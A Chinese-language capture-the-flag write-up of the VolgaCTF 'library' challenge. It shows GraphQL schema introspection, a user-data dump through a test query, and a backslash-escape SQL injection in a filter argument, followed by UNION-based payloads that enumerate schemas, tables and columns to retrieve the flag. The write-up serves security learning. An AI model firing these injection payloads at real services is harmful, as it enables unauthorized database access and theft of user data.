# library

這題方向還蠻明確的

javascript 檔案裡面直接呼叫後端 API 的graphql 功能

所以很明顯是要打 graphql

<br>

先嘗試 dump schema

`{"query":"query {__schema{types{name}} }"}`

=>

`{"data":{"__schema":{"types":[{"name":"Query"},{"name":"String"},{"name":"LoginUser"},{"name":"LoginResponse"},{"name":"UserFilter"},{"name":"User"},{"name":"Book"},{"name":"Mutation"},{"name":"RegisterUser"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"Boolean"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}`

<br>

`{"query":"query {__schema{queryType{fields{name type {kind ofType {kind name}}}}}}"}`

=>

`{"data":{"__schema":{"queryType":{"fields":[{"name":"_empty","type":{"kind":"SCALAR","ofType":null}},{"name":"login","type":{"kind":"OBJECT","ofType":null}},{"name":"testGetUsersByFilter","type":{"kind":"LIST","ofType":{"kind":"OBJECT","name":"User"}}},{"name":"books","type":{"kind":"LIST","ofType":{"kind":"OBJECT","name":"Book"}}}]}}}}`

<br>

User:

`{"query":"query {__type(name: \"User\"){name, fields {name, type {name, kind ofType{name kind}}}} }"}`

=>

`{"data":{"__type":{"name":"User","fields":[{"name":"login","type":{"name":"String","kind":"SCALAR","ofType":null}},{"name":"name","type":{"name":"String","kind":"SCALAR","ofType":null}},{"name":"email","type":{"name":"String","kind":"SCALAR","ofType":null}}]}}}`

<br>

取得使用者帳密:

`{"query":"query {testGetUsersByFilter(filter:{}){name email login}}"}`

但裡面沒看到啥有用資訊

<br>

接著，剛好伺服器有點問題，直接噴錯

`{"errors":[{"message":"connect ECONNREFUSED 172.17.0.2:3306","locations":[{"line":2,"column":3}],"path":["books"],"extensions":{"code":"INTERNAL_SERVER_ERROR","exception":{"errno":"ECONNREFUSED","code":"ECONNREFUSED","syscall":"connect","address":"172.17.0.2","port":3306,"fatal":true}}}],"data":{"books":null}}`

所以知道背後是串 MySQL

接著就嘗試找看看哪邊可能出 SQL Injection

最後發現

`{"query":"query {testGetUsersByFilter(filter:{email:\"\\\\\"}){name email login}}"}`

=>

Error: `{"errors":[{"message":"Database error","locations":[{"line":1,"column":8}],"path":["testGetUsersByFilter"],"extensions":{"code":"INTERNAL_SERVER_ERROR"}}],"data":{"testGetUsersByFilter":null}}`


`{"query":"query {testGetUsersByFilter(filter:{email:\"\\\\asd\"}){name email login}}"}`

=> 

No Error

所以看起來這邊就是一個注入點，可以用反斜線跳脫

<Br>

接著開始撈資料

UNION Based:

`{"query":"query {testGetUsersByFilter(filter:{name:\"\\\\\", email:\"and 1=2 union select 1,2,3,4,5,6-- \"}){name email login}}"}`

欄位數是 6 個

撈 DB:

`{"query":"query {testGetUsersByFilter(filter:{name:\"\\\\\", email:\"and 1=2 union select 1,2,3,4,5,group_concat(schema_name) from information_schema.schemata-- \"}){name email login}}"}`

=>

`information_schema,library`

撈 Table:

`{"query":"query {testGetUsersByFilter(filter:{name:\"\\\\\", email:\"and 1=2 union select 1,2,3,4,5,group_concat(table_name) from information_schema.tables where table_schema=0x6c696272617279-- \"}){name email login}}"}`

=>

`books,flag,users`

撈 Column:

`{"query":"query {testGetUsersByFilter(filter:{name:\"\\\\\", email:\"and 1=2 union select 1,2,3,4,5,group_concat(column_name) from information_schema.columns where table_name=0x666c6167-- \"}){name email login}}"}`

=>

`flag`

最後直接撈 flag:

`VolgaCTF{EassY_GgraPhQl_T@@Sk_ek3k12kckgkdak}`
